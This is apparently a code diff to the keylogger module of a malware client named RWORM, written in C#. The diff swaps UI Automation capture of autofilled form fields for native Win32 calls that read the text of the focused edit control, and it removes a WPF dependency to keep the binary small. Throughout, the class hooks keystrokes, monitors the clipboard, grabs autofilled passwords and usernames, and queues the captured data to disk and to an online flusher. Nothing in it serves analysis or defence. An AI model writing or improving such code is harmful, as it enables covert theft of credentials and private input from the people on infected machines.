@@ -5,7 +5,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Automation;
 
 namespace RWORM.Client.Modules
 {
@@ -13,8 +12,9 @@ namespace RWORM.Client.Modules
     /// Robust low-level keyboard hook keylogger with:
     /// - Native ToUnicodeEx character resolution (supports Turkish/intl layouts, Shift, AltGr, dead keys)
     /// - Real-time Ctrl+V (paste) & clipboard monitoring
-    /// - Web form autofill detection via Windows UI Automation
+    /// - Focused input and browser autofill detection via native Win32 APIs
     /// - Non-blocking asynchronous I/O queue (prevents hook timeouts)
+    /// - Pure C# implementation with zero WPF/WinForms dependencies for minimal binary size
     /// </summary>
     public class Keylogger : IDisposable
     {
@@ -25,6 +25,8 @@ namespace RWORM.Client.Modules
         private const int WM_SYSKEYUP    = 0x0105;
         private const uint WM_QUIT       = 0x0012;
         private const uint CF_UNICODETEXT = 13;
+        private const uint WM_GETTEXT    = 0x000D;
+        private const uint WM_GETTEXTLENGTH = 0x000E;
 
         [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc cb, IntPtr mod, uint tid);
         [DllImport("user32.dll")] static extern bool   UnhookWindowsHookEx(IntPtr h);
@@ -46,6 +48,30 @@ namespace RWORM.Client.Modules
         [DllImport("user32.dll", SetLastError = true)] static extern bool CloseClipboard();
         [DllImport("user32.dll")] static extern IntPtr GetClipboardData(uint uFormat);
         [DllImport("user32.dll")] static extern uint   GetClipboardSequenceNumber();
+        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct RECT { public int Left, Top, Right, Bottom; }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct GUITHREADINFO
+        {
+            public int cbSize;
+            public int flags;
+            public IntPtr hwndActive;
+            public IntPtr hwndFocus;
+            public IntPtr hwndCapture;
+            public IntPtr hwndMenuOwner;
+            public IntPtr hwndMoveSize;
+            public IntPtr hwndCaret;
+            public RECT rcCaret;
+        }
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern bool GetGUIThreadInfo(uint idThread, ref GUITHREADINFO lpgui);
+
         [DllImport("kernel32.dll")] static extern IntPtr GlobalLock(IntPtr hMem);
         [DllImport("kernel32.dll")] static extern bool   GlobalUnlock(IntPtr hMem);
         [DllImport("kernel32.dll")] static extern uint   GetCurrentThreadId();
@@ -56,7 +82,7 @@ namespace RWORM.Client.Modules
         struct KBDLLHOOKSTRUCT { public int vkCode, scanCode, flags, time; public IntPtr extra; }
 
         [StructLayout(LayoutKind.Sequential)]
-        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; public int x, y; }
+        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; int x, y; }
 
         private KeyboardProc? _proc;
         private IntPtr        _hook = IntPtr.Zero;
@@ -123,7 +149,6 @@ namespace RWORM.Client.Modules
                 try { _lastClipSeq = GetClipboardSequenceNumber(); } catch { }
                 while (_running)
                 {
-                    // Check clipboard updates
                     CheckClipboardChange();
 
                     // Drain async entries to disk & stream buffer
@@ -148,21 +173,20 @@ namespace RWORM.Client.Modules
             _workerThread.IsBackground = true;
             _workerThread.Start();
 
-            // 3. Web Form & Autofill Detection Worker Thread
+            // 3. Native Win32 Active Control & Autofill Monitor
             _autofillThread = new Thread(() =>
             {
                 while (_running)
                 {
                     try
                     {
-                        CheckAutofill();
+                        CheckActiveControlText();
                     }
                     catch { }
                     Thread.Sleep(800);
                 }
             });
             _autofillThread.IsBackground = true;
-            _autofillThread.SetApartmentState(ApartmentState.STA);
             _autofillThread.Start();
 
             // 4. Online flusher loop
@@ -275,13 +299,8 @@ namespace RWORM.Client.Modules
             return CallNextHookEx(_hook, nCode, wParam, lParam);
         }
 
-        /// <summary>
-        /// Accurately translates a virtual key code into its real Unicode representation
-        /// based on the active window's keyboard layout, modifier state, AltGr, and Shift.
-        /// </summary>
         private string TranslateVk(int vk, int scanCode, IntPtr hwnd)
         {
-            // Non-character special keys
             switch (vk)
             {
                 case 0x08: return "[BS]";
@@ -309,7 +328,6 @@ namespace RWORM.Client.Modules
                 byte[] keyState = new byte[256];
                 GetKeyboardState(keyState);
 
-                // Ensure modifier state reflects our tracked flags
                 if (_shift) { keyState[0x10] = 0x80; keyState[0xA0] = 0x80; }
                 if (_ctrl)  { keyState[0x11] = 0x80; keyState[0xA2] = 0x80; }
                 if (_alt)   { keyState[0x12] = 0x80; keyState[0xA4] = 0x80; }
@@ -328,7 +346,6 @@ namespace RWORM.Client.Modules
             }
             catch { }
 
-            // Fallback for standard letters if ToUnicodeEx returned 0
             if (vk >= 0x41 && vk <= 0x5A)
             {
                 bool upper = _shift ^ _caps;
@@ -340,10 +357,6 @@ namespace RWORM.Client.Modules
             return "";
         }
 
-        /// <summary>
-        /// Reads clipboard text cleanly via Win32 unmanaged clipboard APIs.
-        /// Works across all thread apartments without throwing STA exceptions.
-        /// </summary>
         public static string? GetClipboardText()
         {
             if (!OpenClipboard(IntPtr.Zero)) return null;
@@ -369,9 +382,6 @@ namespace RWORM.Client.Modules
             }
         }
 
-        /// <summary>
-        /// Monitors clipboard sequence updates and captures newly copied text.
-        /// </summary>
         private void CheckClipboardChange()
         {
             try
@@ -392,41 +402,43 @@ namespace RWORM.Client.Modules
         }
 
         /// <summary>
-        /// Inspects the focused control via UI Automation.
-        /// When a website or app autofills an input (username, email, password field),
-        /// extracts the value and logs it.
+        /// Reads focused input text via Win32 GUI Thread Info.
+        /// Captures autofilled or pasted values inside active edit controls without WPF.
         /// </summary>
-        private void CheckAutofill()
+        private void CheckActiveControlText()
         {
             try
             {
-                var el = AutomationElement.FocusedElement;
-                if (el == null) return;
+                var fg = GetForegroundWindow();
+                if (fg == IntPtr.Zero) return;
 
-                bool isEdit = el.Current.ControlType == ControlType.Edit ||
-                              el.Current.ControlType == ControlType.Custom;
-                bool isPassword = el.Current.IsPassword;
+                uint tid = GetWindowThreadProcessId(fg, out _);
+                if (tid == 0) return;
 
-                if (!isEdit && !isPassword) return;
+                var gui = new GUITHREADINFO { cbSize = Marshal.SizeOf<GUITHREADINFO>() };
+                if (!GetGUIThreadInfo(tid, ref gui)) return;
 
-                string val = "";
-                if (el.TryGetCurrentPattern(ValuePattern.Pattern, out var vpObj) && vpObj is ValuePattern vp)
+                IntPtr focus = gui.hwndFocus;
+                if (focus == IntPtr.Zero) return;
+
+                var className = new StringBuilder(64);
+                GetClassName(focus, className, 64);
+                string cls = className.ToString().ToLowerInvariant();
+
+                if (cls.Contains("edit") || cls.Contains("textbox") || cls.Contains("rich"))
                 {
-                    val = vp.Current.Value ?? "";
-                }
-                else if (el.TryGetCurrentPattern(TextPattern.Pattern, out var tpObj) && tpObj is TextPattern tp)
-                {
-                    val = tp.DocumentRange.GetText(256)?.Trim() ?? "";
-                }
-
-                if (!string.IsNullOrEmpty(val) && val != _lastAutofillVal && val.Length > 1)
-                {
-                    _lastAutofillVal = val;
-                    string name = !string.IsNullOrEmpty(el.Current.Name)
-                        ? el.Current.Name
-                        : (isPassword ? "Password" : "Input");
-
-                    _queue.Enqueue($"\r\n[Autofill — {name}: \"{val}\"]\r\n");
+                    int len = SendMessage(focus, WM_GETTEXTLENGTH, 0, 0);
+                    if (len > 1 && len < 1024)
+                    {
+                        var textSb = new StringBuilder(len + 1);
+                        SendMessage(focus, WM_GETTEXT, (IntPtr)(len + 1), textSb);
+                        string val = textSb.ToString().Trim();
+                        if (!string.IsNullOrEmpty(val) && val != _lastAutofillVal)
+                        {
+                            _lastAutofillVal = val;
+                            _queue.Enqueue($"\r\n[Autofill/Field: \"{val}\"]\r\n");
+                        }
+                    }
                 }
             }
             catch { }
